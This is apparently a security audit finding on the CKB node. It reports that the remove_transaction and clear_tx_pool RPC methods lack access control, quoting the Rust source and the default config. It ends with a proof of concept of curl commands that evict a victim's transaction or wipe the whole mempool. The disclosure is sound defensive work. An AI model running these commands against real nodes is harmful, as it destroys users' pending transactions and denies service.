### Title
Missing Access Control on `remove_transaction` and `clear_tx_pool` RPC Methods Allows Any Caller to Evict Arbitrary Transactions from the Pool — (File: `rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` and `clear_tx_pool` RPC methods in the `Pool` module perform destructive, irreversible mutations on the transaction pool without any authentication or caller-identity check. Any process that can reach the RPC endpoint — which is the `Pool` module enabled by default — can silently evict any pending transaction submitted by any user, or wipe the entire pool. This is a direct structural analog to H-14: a privileged state-mutation function is callable by any unprivileged party with no restriction.

---

### Finding Description

**Root cause — `remove_transaction`:**

```rust
// rpc/src/module/pool.rs:662-669
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

There is no check on who is calling this method. The caller supplies any `tx_hash` and the node unconditionally removes that transaction — and all of its descendants — from the pool.

**Root cause — `clear_tx_pool`:**

```rust
// rpc/src/module/pool.rs:684-692
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

Again, no caller identity check. Any reachable RPC caller can wipe the entire pending pool in a single call.

**Module is enabled by default:**

```toml
# resource/ckb.toml:190
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

The `Pool` module — which exposes both `remove_transaction` and `clear_tx_pool` — is in the default module list. No opt-in is required.

**No authentication layer exists in the RPC server.** The RPC framework (`jsonrpc_utils`) used by CKB does not implement any token, session, or identity mechanism. Every method in every enabled module is callable by any HTTP client that can reach the listen address.

---

### Impact Explanation

1. **Targeted transaction eviction**: An attacker who knows (or can enumerate via `get_raw_tx_pool`) the hash of a victim's pending transaction can call `remove_transaction` to silently drop it from the pool. The victim's transaction disappears without error; the victim must resubmit and pay fees again. For time-sensitive transactions (e.g., those with `since` lock constraints, RBF replacements, or DAO withdrawal deadlines), eviction at the right moment causes permanent loss of the time window.

2. **Full pool wipe**: `clear_tx_pool` removes every pending and proposed transaction in one call. All users who submitted transactions lose their queue position. Miners lose their assembled block template. This is a complete denial-of-service against the mempool with a single unauthenticated RPC call.

3. **Cascading removal**: `remove_transaction` removes the target and all dependent transactions (children in the UTXO DAG), so a single call can evict an entire transaction chain built by multiple users.

---

### Likelihood Explanation

The RPC binds to `127.0.0.1:8114` by default. This means:

- **Any co-located process** (another application, a compromised dependency, a malicious script run by the same user) can call these methods with no credential.
- **Many production deployments expose the RPC to wider networks** (e.g., `0.0.0.0:8114` for remote miner access), at which point any network-reachable client qualifies.
- The attacker needs only HTTP access and knowledge of a tx hash (publicly observable via `get_raw_tx_pool` or P2P gossip).
- No key, signature, or privileged credential is required.

The RESEARCHER.md explicitly lists "Malicious API/RPC/web client submitting crafted inputs at scale" and "RPC caller" as in-scope attacker profiles.

---

### Recommendation

1. **Add an authentication token** to the RPC server. The node operator configures a secret token in `ckb.toml`; all mutating RPC calls must supply it via HTTP `Authorization` header or a JSON-RPC extension field.

2. **Separate destructive methods into a restricted module** (e.g., `Admin`) that is disabled by default and requires explicit opt-in, analogous to how `Debug` and `IntegrationTest` modules are already separated.

3. **At minimum**, document `remove_transaction` and `clear_tx_pool` as operator-only methods and gate them behind a feature flag or separate listen address, so they are not reachable on the same port as read-only methods.

---

### Proof of Concept

**Precondition**: Node running with default config (`Pool` module enabled, RPC on `127.0.0.1:8114`). Victim submits a transaction.

**Step 1** — Enumerate the pool (no auth required):
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns list of all pending tx hashes
```

**Step 2** — Evict the victim's transaction (no auth required):
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"remove_transaction","params":["<victim_tx_hash>"]}'
# Returns {"result": true} — transaction silently removed
```

**Step 3** — Or wipe the entire pool:
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns {"result": null} — all pending transactions gone
```

**Expected outcome**: The victim's transaction is no longer in the pool. `get_transaction` returns `null` for its status. The victim must resubmit. For time-locked or deadline-sensitive transactions, the window may be permanently lost. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
